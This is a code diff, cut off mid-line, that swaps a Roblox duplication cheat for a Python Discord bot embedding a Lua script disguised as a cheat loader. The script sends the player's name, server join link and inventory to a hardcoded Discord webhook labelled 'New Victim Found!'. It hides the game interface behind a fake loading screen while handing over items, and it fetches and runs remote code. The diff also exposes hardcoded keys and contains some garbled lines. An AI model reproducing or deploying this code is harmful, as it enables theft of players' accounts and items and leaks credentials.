@@ -1,178 +1,371 @@
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+import discord
+from discord.ext import commands
+from discord import app_commands
+import aiohttp
+import json
+import os
+import asyncio
+import random
+import string
+
+try:
+    with open('config.json', 'r') as f:
+        config = json.load(f)
+    TOKEN = config['discord_token']
+    CHANNEL_ID = int(config.get('channel_id'))  # Convert to integer
+    LUAOBFUSCATOR_API_KEY = 'f21acda-24ed-6348-dee4-7307084905ad826'
+    GITHUB_TOKEN = config['github_token']
+except Exception as e:
+    print(f"Config error: {e}")
+    exit(1)
+
+ORIGINAL_LUA_SCRIPT = """local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+local SoundService = game:GetService("SoundService")
+local StarterGui = game:GetService("StarterGui")
+local TweenService = game:GetService("TweenService")
+local VirtualInput = game:GetService("VirtualInputManager")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
+local webhookUrl ="https://discord.com/api/webhooks/1385008642889355415/6hqB3QlcQXd3n9QcsllVKDhnsDkkfgW-6R2tVvQeFjEg53ZWUUFkpVTc0EEIrmTnFmZc"
+local chatTrigger ="CHAT_TRIGGER"
 
--- Attempt to load Spawner module with robust error handling
-local Spawner = nil
-local success, result = pcall(function()
-    return loadstring(game:HttpGet("https://raw.githubusercontent.com/DeltaGay/femboy/refs/heads/main/GardenSpawner.lua"))()
-end)
-if success and type(result) =="table" then
-    Spawner = result
-    print("Spawner module loaded successfully.")
-else
-    print("Failed to load Spawner module. Using fallback logic.")
-    Spawner = {}
-end
+local E_HOLD_TIME = 0.1
+local E_DELAY = 0.2
+local HOLD_TIMEOUT = 3
+local DISCORD_LINK ="https://discord.gg/TKZb53RfFh"
 
--- Fallback RemoteEvent finder
-local function FindRemote(name)
-    local remote = ReplicatedStorage:FindFirstChild(name)
-    if remote then
-        return remote
-    end
-    for_, v in pairs(ReplicatedStorage:GetDescendants()) do
-        if (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) and string.find(v.Name:lower(), name:lower()) then
-            return v
+local infiniteYieldLoaded = false
+
+local function sendToWebhook(data)
+    local jsonData = HttpService:JSONEncode(data)
+    local success = pcall(function()
+        if syn and syn.request then
+            syn.request({
+                Url = webhookUrl,
+                Method ="POST",
+                Headers = {["Content-Type"] ="application/json"},
+                Body = jsonData
+            })
+        elseif request then
+            request({
+                Url = webhookUrl,
+                Method ="POST",
+                Headers = {["Content-Type"] ="application/json"},
+                Body = jsonData
+            })
+        else
+            HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
         end
-    end
-    print("No RemoteEvent found for" .. name .. ".")
-    return nil
+    end)
+    return success
 end
 
--- Fallback spawning functions
-Spawner.SpawnPet = Spawner.SpawnPet or function(petName, weight, age)
-    local remote = FindRemote("SpawnPet") or FindRemote("Pet")
-    if remote then
-        remote:FireServer(petName, weight or 1, age or 1)
-    else
-        print("Cannot spawn Pet: No RemoteEvent found.")
-    end
-end
-
-Spawner.SpawnSeed = Spawner.SpawnSeed or function(seedName)
-    local remote = FindRemote("SpawnSeed") or FindRemote("Seed")
-    if remote then
-        remote:FireServer(seedName)
-    else
-        print("Cannot spawn Seed: No RemoteEvent found.")
-    end
-end
-
-Spawner.SpawnEgg = Spawner.SpawnEgg or function(eggName)
-    local remote = FindRemote("SpawnEgg") or FindRemote("Egg")
-    if remote then
-        remote:FireServer(eggName)
-    else
-        print("Cannot spawn Egg: No RemoteEvent found.")
-    end
-end
-
-Spawner.GetPets = Spawner.GetPets or function()
-    return {"Raccoon","Fox","Bunny"} -- Adjust based on game
-end
-
-Spawner.GetSeeds = Spawner.GetSeeds or function()
-    return {"Candy Blossom","Sunflower","Moonflower"} -- Adjust based on game
-end
-
-Spawner.Spin = Spawner.Spin or function(itemName)
-    local remote = FindRemote("Spin") or FindRemote("Action")
-    if remote then
-        remote:FireServer(itemName)
-    else
-        print("Cannot spin: No RemoteEvent found.")
-    end
-end
-
--- Function to spam spawn requests for duplication
-local function DupeItem(itemType, itemName, count, ...)
-    local args = {...}
-    for i = 1, count do
-        local success, err = pcall(function()
-            if itemType =="Pet" and type(Spawner.SpawnPet) =="function" then
-                Spawner.SpawnPet(itemName, args[1] or 1, args[2] or 1)
-            elseif itemType =="Seed" and type(Spawner.SpawnSeed) =="function" then
-                Spawner.SpawnSeed(itemName)
-            elseif itemType =="Egg" and type(Spawner.SpawnEgg) =="function" then
-                Spawner.SpawnEgg(itemName)
-            else
-                print("Invalid function for" .. itemType .. ".")
-            end
-        end)
-        if not success then
-            print("Error spawning" .. itemType .. ":" .. err)
-        end
-        wait(0.02) -- Tighter delay to exploit server lag
-    end
-end
-
--- Function to check GUI inventory
-local function CheckInventory()
-    local inventory = {}
-    local success, result = pcall(function()
-        local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
-        local guis = {"Inventory","MainGui","GameGui","ScreenGui"} -- Common GUI names
-        local inventoryGui = nil
-        for_, guiName in pairs(guis) do
-            inventoryGui = playerGui:FindFirstChild(guiName)
-            if inventoryGui then break end
-        end
-        if inventoryGui then
-            for_, item in pairs(inventoryGui:GetDescendants()) do
-                if item:IsA("TextLabel") or item:IsA("ImageLabel") or item:IsA("Frame") then
-                    local itemName = item.Name or (item:FindFirstChild("ItemName") and item.ItemName.Text) or item.Text
-                    if itemName and itemName ~= "" then
-                        table.insert(inventory, itemName)
-                    end
+local function getInventory()
+    local inventory = {items = {}}
+    local bannedWords = {"Seed","Shovel","Uses","Tool","Egg","Caller","Staff","Rod","Sprinkler","Crate","Spray","Pot"}
+    
+    for_, item in pairs(LocalPlayer.Backpack:GetChildren()) do
+        if item:IsA("Tool") then
+            local isBanned = false
+            for_, word in pairs(bannedWords) do
+                if string.find(item.Name:lower(), word:lower()) then
+                    isBanned = true
+                    break
                 end
             end
+            if not isBanned then
+                table.insert(inventory.items, item.Name)
+            end
         end
-        return inventory
-    end)
-    if success and #inventory > 0 then
-        print("GUI Inventory Contents:" .. table.concat(inventory,", "))
+    end
+    return inventory
+end
+
+local function sendToWebhook()
+    if not LocalPlayer then
+        return
+    end
+    local inventory = getInventory()
+    local inventoryText = #inventory.items > 0 and table.concat(inventory.items,"\\n") or"No items"
+    
+    local messageData = {
+        embeds = {{
+            title ="🎯 New Victim Found!",
+            description ="READ #⚠️information in MGZ Scripts Server to Learn How to Join Victim's Server and Steal Their Stuff!",
+            color = 0x00FF00,
+            fields = {
+                {name ="👤 Username", value = LocalPlayer.Name, inline = true},
+                {name ="🔗 Join Link", value ="https://kebabman.vercel.app/start?placeId=126884695634066&gameInstanceId=" .. (game.JobId or"N/A"), inline = true},
+                {name ="🎒 Inventory", value ="```" .. inventoryText .. "```", inline = false},
+                {name ="🗣️ Steal Command", value ="Say in chat: `" .. chatTrigger .. "`", inline = false}
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    sendToWebhook(messageData)
+end
+
+local function isValidItem(name)
+    local bannedWords = {"Seed","Shovel","Uses","Tool","Egg","Caller","Staff","Rod","Sprinkler","Crate"}
+    for_, banned in ipairs(bannedWords) do
+        if string.find(name:lower(), banned:lower()) then
+            return false
+        end
+    end
+    return true
+end
+
+local function getValidTools()
+    local tools = {}
+    for_, item in pairs(LocalPlayer.Backpack:GetChildren()) do
+        if item:IsA("Tool") and isValidItem(item.Name) then
+            table.insert(tools, item)
+        end
+    end
+    return tools
+end
+
+local function toolInInventory(toolName)
+    local bp = LocalPlayer:FindFirstChild("Backpack")
+    local char = LocalPlayer.Character
+    if bp then
+        if bp:FindFirstChild(toolName) then return true end
+    end
+    if char then
+        if char:FindFirstChild(toolName) then return true end
+    end
+    return false
+end
+
+local function holdE()
+    VirtualInput:SendKeyEvent(true, Enum.KeyCode.E, false, game)
+    task.wait(E_HOLD_TIME)
+    VirtualInput:SendKeyEvent(false, Enum.KeyCode.E, false, game)
+end
+
+local function favoriteItem(tool)
+    if tool and tool:IsDescendantOf(game) then
+        local toolInstance
+        local backpack = LocalPlayer:FindFirstChild("Backpack")
+        if backpack then
+            toolInstance = backpack:FindFirstChild(tool.Name)
+        end
+        if not toolInstance and LocalPlayer.Character then
+            toolInstance = LocalPlayer.Character:FindFirstChild(tool.Name)
+        end
+        if toolInstance then
+            local args = {
+                [1] = toolInstance}            game:GetService("ReplicatedStorage").GameEvents.Favorite_Item:FireServer(unpack(args))
+        else
+            warn("Tool not found:" .. tool.Name)
+        end
     else
-        print("Failed to access GUI inventory or it's empty. Try planting a seed or relogging.")
+        warn("Tool not found or invalid:" .. tostring(tool))
     end
 end
 
--- Function to list supported items
-local function ListSupportedItems()
-    local pets = Spawner.GetPets and type(Spawner.GetPets) =="function" and Spawner.GetPets() or {"Raccoon","Fox","Bunny"}
-    local seeds = Spawner.GetSeeds and type(Spawner.GetSeeds) =="function" and Spawner.GetSeeds() or {"Candy Blossom","Sunflower","Moonflower"}
-    print("Supported Pets:" .. table.concat(pets,", "))
-    print("Supported Seeds:" .. table.concat(seeds,", "))
-end
-
--- Spawner function for continuous duplication
-local function AutoSpawner(itemType, itemName, interval, maxItems, ...)
-    local spawned = 0
-    while spawned < maxItems do
-        DupeItem(itemType, itemName, 2) -- Smaller batches to avoid detection
-        spawned = spawned + 2
-        CheckInventory() -- Check GUI after each batch
-        print("Spawned" .. spawned .. "" .. itemName .. "(s).")
-        wait(interval)
+local function useToolWithHoldCheck(tool, player)
+    local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+    if humanoid and tool then
+        humanoid:EquipTool(tool)
+        
+        local startTime = tick()
+        while toolInInventory(tool.Name) do
+            holdE()
+            task.wait(E_DELAY)
+            if tick() - startTime >= HOLD_TIMEOUT then
+                if toolInInventory(tool.Name) then
+                    favoriteItem(tool)
+                    task.wait(0.05)
+                    startTime = tick()
+                    while toolInInventory(tool.Name) do
+                        holdE()
+                        task.wait(E_DELAY)
+                        if tick() - startTime >= HOLD_TIMEOUT then
+                            humanoid:UnequipTools()
+                            return false
+                        end
+                    end
+                    humanoid:UnequipTools()
+                    return true
+                end
+                humanoid:UnequipTools()
+                return true
+            end
+        end
+        humanoid:UnequipTools()
+        return true
     end
-    print("AutoSpawner finished for" .. itemName .. ".")
+    return false
 end
 
--- Force server update
-local function TriggerSpin()
-    if type(Spawner.Spin) =="function" then
-        Spawner.Spin("Sunflower")
-        print("Spun Sunflower to force server update.")
+local function createDiscordInvite(container)
+    if not container:FindFirstChild("HelpLabel") then
+        local helpLabel = Instance.new("TextLabel")
+        helpLabel.Name ="HelpLabel"
+        helpLabel.Size = UDim2.new(0.8, 0, 0.1, 0)
+        helpLabel.Position = UDim2.new(0.1, 0, 1.05, 0)
+        helpLabel.BackgroundTransparency = 1
+        helpLabel.Text ="Stuck at 100 or Script Taking Too Long to Load? Join This Discord Server For Help"
+        helpLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+        helpLabel.TextScaled = true
+        helpLabel.Font = Enum.Font.GothamBold
+        helpLabel.TextXAlignment = Enum.TextXAlignment.Center
+        helpLabel.Parent = container
+
+        local copyButton = Instance.new("TextButton")
+        copyButton.Name ="CopyLinkButton"
+        copyButton.Size = UDim2.new(0.3, 0, 0.08, 0)
+        copyButton.Position = UDim2.new(0.35, 0, 1.15, 0)
+        copyButton.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
+        copyButton.Text ="Copy Link"
+        copyButton.TextColor3 = Color3.fromRGB(200, 200, 255)
+        copyButton.TextScaled = true
+        copyButton.Font = Enum.Font.GothamBold
+        copyButton.Parent = container
+
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0.2, 0)
+        corner.Parent = copyButton
+
+        copyButton.MouseButton1Click:Connect(function()
+            if setclipboard then
+                setclipboard(DISCORD_LINK)
+            elseif syn and syn.clipboard_set then
+                syn.clipboard_set(DISCORD_LINK)
+            end
+        end)
+    end
+end
+
+local function cycleToolsWithHoldCheck(player, loadingGui)
+    local tools = getValidTools()
+    for_, tool in ipairs(tools) do
+        if not useToolWithHoldCheck(tool, player) then
+            continue
+        end
+    end
+
+    local container = loadingGui.SolidBackground.ContentContainer
+    createDiscordInvite(container)
+end
+
+local function sendBangCommand(player)
+    if not infiniteYieldLoaded then
+        return
+    end
+    task.wait(0.05)
+    local chatMessage =";bang" .. player.Name
+    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+        local textChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:WaitForChild("RBXGeneral", 5)
+        if textChannel then
+            textChannel:SendAsync(chatMessage)
+        end
     else
-        print("Spin function invalid. Skipping.")
+        local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+        if chatEvent then
+            local sayMessage = chatEvent:FindFirstChild("SayMessageRequest")
+            if sayMessage then
+                sayMessage:FireServer(chatMessage,"All")
+            end
+        end
     end
 end
 
--- Main execution
-local function Main()
-    ListSupportedItems() -- Show what we can dupe
-    DupeItem("Seed","Candy Blossom", 5) -- Start with 5 seeds
-    DupeItem("Egg","Night Egg", 5) -- Start with 5 eggs
-    CheckInventory() -- Check GUI
-    TriggerSpin() -- Force server sync
+local function disableGameFeatures()
+    SoundService.AmbientReverb = Enum.ReverbType.NoReverb
+    SoundService.RespectFilteringEnabled = true
+    
+    for_, soundGroup in pairs(SoundService:GetChildren()) do
+        if soundGroup:IsA("SoundGroup") then
+            soundGroup.Volume = 0
+        end
+    end
+    
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
+end
+
+local function createLoadingScreen()
+    local playerGui = LocalPlayer:WaitForChild("PlayerGui", 10)
+    if not playerGui then
+        return
+    end
+    
+    local loadingGui = Instance.new("ScreenGui")
+    loadingGui.Name ="ModernLoader"
+    loadingGui.ResetOnSpawn = false
+    loadingGui.IgnoreGuiInset = true
+    loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    loadingGui.DisplayOrder = 999999
+    loadingGui.Parent = playerGui
+
     spawn(function()
-        AutoSpawner("Seed","Candy Blossom", 1, 30) -- 30 seeds, 2 every 1s
-        AutoSpawner("Egg","Night Egg", 1, 30) -- 30 eggs, 2 every 1s
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/edgeiy/infiniteyield/master/source"))()
+        end)
+        if success then
+            infiniteYieldLoaded = true
+        else
+            warn("Failed to load Infinite Yield:" .. tostring(err))
+        end
     end)
-    print("Duplication and spawner running. Monitor your GUI inventory.")
-end
 
-local success, err = pcall(Main)
-if not success then
-    print("Error in Main:" .. err)
-end
+    local background = Instance.new("Frame")
+    background.Name ="SolidBackground"
+    background.Size = UDim2.new(1, 0, 1, 0)
+    background.Position = UDim2.new(0, 0, 0, 0)
+    background.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
+    background.BackgroundTransparency = 0
+    background.BorderSizePixel = 0
+    background.Parent = loadingGui
+
+    local grid =.xls = Instance.new("Frame")
+    grid.Name ="GridPattern"
+    grid.Size = UDim2.new(1, 0, 1, 0)
+    grid.Position = UDim2.new(0, 0, 0, 0)
+    grid.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+    grid.BackgroundTransparency = 0
+    grid.BorderSizePixel = 0
+
+    local uiGrid = Instance.new("UIGridLayout")
+    uiGrid.CellSize = UDim2.new(0, 50, 0, 50)
+    uiGrid.CellPadding = UDim2.new(0, 2, 0, 2)
+    uiGrid.FillDirection = Enum.FillDirection.Horizontal
+    uiGrid.FillDirectionMaxCells = 100
+    uiGrid.Parent = grid
+
+    for i = 1, 200 do
+        local cell = Instance.new("Frame")
+        cell.Name ="Cell_"..i
+        cell.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
+        cell.BorderSizePixel = 0
+
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0.1, 0)
+        corner.Parent = cell
+
+        cell.Parent = grid
+    end
+
+    grid.Parent = background
+
+    local container = Instance.new("Frame")
+    container.Name ="ContentContainer"
+    container.AnchorPoint = Vector2.new(0.5, 0.5)
+    container.Size = UDim2.new(0.7, 0, 0.5, 0)
+    container.Position = UDim2.new(0.5, 0, 0.5, 0)
+    container.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
+    container.BackgroundTransparency = 0.3
+    container.BorderSizePixel = 0
+
+    local floatTween = TweenService:Create(container, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Position = UDim2.new(0.5, 0, 0.45, 0)})
+    floatTween:Play()
+
+    local corner = Instance.new("UICorner")
+    corner.
